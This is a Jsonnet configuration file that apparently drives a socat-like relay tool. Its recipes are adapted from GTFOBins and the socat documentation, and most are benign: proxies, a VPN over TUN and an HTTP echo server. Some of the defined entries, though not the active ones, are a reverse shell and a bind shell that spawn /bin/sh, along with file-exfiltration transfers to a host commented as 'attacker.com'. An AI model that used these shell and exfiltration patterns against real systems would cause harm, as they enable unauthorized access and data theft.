local exec = std.native("exec");
local env = function(k) exec("printenv " + k);

// https://gtfobins.github.io/gtfobins/socat/
local shell = {
  from: {
    kind: "stdin",
  },
  to: {
    kind: "exec",
    command: "/bin/sh",
  },
};
local reverse_shell = {
  receiver: {
    from: {
      kind: "file",
      filename: exec("tty"),
      raw: true,
      echo: 0,
    },
    to: {
      kind: "tcp-listen",
      port: 12345,
    },
  },
  remote: {
    local RHOST = "localhost", // "attacker.com",
    local RPORT = 12345,
    from: {
      kind: "tcp-connect",
      host: RHOST,
      port: RPORT,
    },
    to: {
      kind: "exec",
      command: "/bin/sh",
      pty: true,
      stderr: true,
      setsid: true,
      sigint: true,
      sane: true,
    },
  },
};
local bind_shell = {
  receiver: {
    from: {
      kind: "file",
      filename: exec("tty"),
      raw: true,
      echo: 0,
    },
    to: {
      kind: "TCP",
      host: "localhost", // "target.com",
      port: 12345,
    },
  },
  remote: {
    local LPORT = 12345,
    from: {
      kind: "TCP-LISTEN",
      port: LPORT,
      reuseaddr: true,
      fork: true,
    },
    to: {
      kind: "exec",
      command: "/bin/sh",
      pty: true,
      stderr: true,
      setsid: true,
      sigint: true,
      sane: true,
    },
  },
};
local file = {
  download: {
    downloader: {
      from: {
        kind: "tcp-listen",
        port: 12345,
        reuseaddr: true,
      },
      to: {
        kind: "open",
        filename: "file_to_save",
        create: true,
      },
      opts: {
        left_to_right: true,
      },
    },
    remote: {
      local RHOST = "localhost", // "attacker.com",
      local RPORT = 12345,
      local LFILE = "file_to_send",
      from: {
        kind: "file",
        filename: LFILE,
      },
      to: {
        kind: "tcp-connect",
        host: RHOST,
        port: RPORT,
      },
      opts: {
        left_to_right: true,
      },
    },
  },
  upload: {
    uploader: {
      from: {
        kind: "file",
        filename: "file_to_send",
      },
      to: {
        kind: "tcp-listen",
        port: 12345,
        reuseaddr: true,
      },
      opts: {
        left_to_right: true,
      }
    },
    remote: {
      local RHOST = "localhost", // "attacker.com",
      local RPORT = 12345,
      local LFILE = "file_to_save",
      from: {
        kind: "tcp-connect",
        host: RHOST,
        port: RPORT,
      },
      to: {
        kind: "open",
        filename: LFILE,
        create: true,
      },
      opts: {
        left_to_right: true,
      },
    },
  },
  read: {
    local LFILE = "file_to_read",
    from: {
      kind: "file",
      filename: LFILE,
    },
    to: {
      kind: "stdout",
    },
    opts: {
      left_to_right: true,
    },
  },
};

// http://www.dest-unreach.org/socat/doc/socat.html#EXAMPLES
local tcp = {
  raw: {
    from: {
      kind: "stdin",
    },
    to: {
      kind: "tcp-connect",
      host: "example.org",
      port: 80,
    },
  },
  readline: {
    from: {
      kind: "READLIN",
      history: env("HOME") + "/.http_history",
    },
    to: {
      kind: "TCP4",
      host: "example.org",
      port: "www",
      crnl: true,
    },
    opts: {
      verbosity: 2,
    },
  },
  forward: {
    from: {
      kind: "TCP4-LISTEN",
      port: "www",
    },
    to: {
      kind: "TCP4",
      host: "example.org",
      port: "www",
    },
  },
};
local http_echo_server = {
  from: {
    kind: "TCP-L",
    port: 10081,
    reuseaddr: true,
    fork: true,
    crlf: true,
  },
  to: {
    kind: "SYSTEM",
    command: |||
      echo -e "
        HTTP/1.0 200 OK
        DocumentType: text/plain

        date: $(date)
        server: $SOCAT_SOCKADDR:$SOCAT_SOCKPORT
        client: $SOCAT_PEERADDR:$SOCAT_PEERPORT
      "; cat; echo -e "\"\n"
    |||,
  },
  opts: {
    inactivity_timeout_seconds: 1,
    verbosity: 2,
  },
};

// http://www.dest-unreach.org/socat/doc/socat-tun.html
local vpn = {
  server: {
    from: {
      kind: "UDP-LISTEN",
      port: 11443,
      reuseaddr: true,
    },
    to: {
      kind: "TUN",
      subnet: "192.168.255.1/24",
      up: true,
    },
    opts: {
      verbosity: 2,
    },
  },
  client: {
    from: {
      kind: "UDP",
      host: "1.2.3.4", // server public addr
      port: 11443,
      reuseaddr: true,
    },
    to: {
      kind: "TUN",
      subnet: "192.168.255.2/24",
      up: true,
    },
  },
};

// https://serverfault.com/a/407382
local socks_proxy = {
  from: {
    kind: "TCP-LISTEN",
    port: 1234,
    fork: true,
  },
  to: {
    kind: "SOCKS4A",
    server: "127.0.0.1",
    host: "google.com",
    port: 80,
    socksport: 5678,
  }
};
// In-process HTTP proxy: plain HTTP in on :1337,
// reconstructed + forwarded over HTTPS to the gateway,
// headers copied, req/resp dumped.
local http_proxy = {
  from: { kind: "http-listen", port: 2448 },
  to:   { kind: "http-connect", host: "reqres.in", port: 443, tls: true },
};

[
  // shell,
  // reverse_shell.receiver,
  // reverse_shell.remote,
  // bind_shell.receiver,
  // bind_shell.remote,
  // file.download.downloader,
  // file.download.remote,
  // file.upload.uploader,
  // file.upload.remote
  socks_proxy,
  http_proxy,
]
